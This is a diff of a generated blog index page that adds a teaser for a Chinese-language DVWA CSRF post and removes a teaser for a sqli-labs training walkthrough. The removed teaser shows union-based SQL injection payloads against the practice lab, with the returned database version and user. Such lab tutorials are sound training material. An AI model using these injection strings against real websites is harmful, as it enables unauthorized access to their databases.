@@ -283,6 +283,131 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/26/DVWA-CSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/07/26/DVWA-CSRF/" itemprop="url">DVWA-CSRF</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-26T11:25:48+08:00">
+                2018-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><strong>CSRF（Cross-site request forgery）跨站请求伪造:</strong><br>    主要利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<h3 id="跨站脚本（XSS）与跨站请求伪造-CSRF-区别"><a href="#跨站脚本（XSS）与跨站请求伪造-CSRF-区别" class="headerlink" title="跨站脚本（XSS）与跨站请求伪造(CSRF)区别"></a>跨站脚本（XSS）与跨站请求伪造(CSRF)区别</h3><p>XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/26/DVWA-CSRF/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/23/DVWA-Brute_Force/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1771,169 +1896,11 @@ Table: users
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/19/sqli-labs-Less-1-4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ahodor">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ahodor'Via">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/19/sqli-labs-Less-1-4/" itemprop="url">sqli-labs_Less_1-4</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-19T15:56:00+08:00">
-                2018-04-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="sqli-labs练习SQL注入（mysql）"><a href="#sqli-labs练习SQL注入（mysql）" class="headerlink" title="sqli-labs练习SQL注入（mysql）"></a>sqli-labs练习SQL注入（mysql）</h1><p> 漏洞源代码下载：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
-<h2 id="手工注入-hackbar"><a href="#手工注入-hackbar" class="headerlink" title="手工注入(hackbar)"></a>手工注入(hackbar)</h2><h3 id="Less-1-Get-Error-Single-quotes-String"><a href="#Less-1-Get-Error-Single-quotes-String" class="headerlink" title="Less-1 Get-Error-Single quotes-String"></a>Less-1 Get-Error-Single quotes-String</h3><p>从标题可以知是基于get请求方法的单引号字符报错</p>
-<p>页面提示输入<strong>数字型参数 id</strong></p>
-<pre><code>/sqli-labs/Less-1/?id=1
-</code></pre><p>返回正常页面</p>
-<pre><code>Welcome    Dhakkan
-Your Login name:Dumb
-Your Password:Dumb
-</code></pre><p>加一个单引号测试</p>
-<pre><code>sqli-labs/Less-1/?id=1&apos;
-</code></pre><p>页面报错</p>
-<pre><code>Welcome    Dhakkan
-You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 
-</code></pre><p>从外层依次去掉闭合的单引号可以看到只剩下 <strong>1’</strong>  ,可知为<strong>字符型注sql注入</strong>（字符型和数字型的区别会在Less-2后区分）。</p>
-<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>在这里使用 # 或– 注释掉多余的部分（当然，这里也可以使用其他方法闭合这个单引号），对#进行了url编码，构造好使其正常返回。</p>
-<pre><code>sqli-labs/Less-1/?id=1&apos; %23
-</code></pre><p>返回正常</p>
-<h3 id="猜测字段数（order-by-）"><a href="#猜测字段数（order-by-）" class="headerlink" title="猜测字段数（order by ）"></a>猜测字段数（order by ）</h3><p>使用<strong>联合查询 (union select)</strong><br>首先使用<strong>order by</strong> 进行字段数猜测</p>
-<pre><code>sqli-labs/Less-1/?id=1&apos;  order by 10%23
-</code></pre><p>返回错误 ：Unknown column ‘10’ in ‘order clause’ </p>
-<pre><code>sqli-labs/Less-1/?id=1&apos;  order by 5%23
-</code></pre><p>返回正常</p>
-<pre><code>sqli-labs/Less-1/?id=1&apos;  order by 6%23
-</code></pre><p>返回错误<br>可知字段数为 5</p>
-<h3 id="找到显示位"><a href="#找到显示位" class="headerlink" title="找到显示位"></a>找到显示位</h3><pre><code>sqli-labs/Less-1/?id=-1&apos;  union select 1,2,3,4,5%23
-</code></pre><p>这里注意<strong>把id的值设置为一个错误的值</strong>，这里设置为了-1可知显示位在 2，3</p>
-<pre><code> Welcome    Dhakkan
-Your Login name:2
-Your Password:3
-</code></pre><h3 id="查看目标数据库基本信息"><a href="#查看目标数据库基本信息" class="headerlink" title="查看目标数据库基本信息"></a>查看目标数据库基本信息</h3><pre><code>sqli-labs/Less-1/?id=-1&apos;  union select 1,version(),user(),4,5%23
-</code></pre><p>返回如下  </p>
-<pre><code>Welcome    Dhakkan
-Your Login name:5.5.53
-Your Password:root@localhost
-</code></pre>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/04/19/sqli-labs-Less-1-4/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1979,7 +1946,7 @@ Your Password:root@localhost
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">21</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
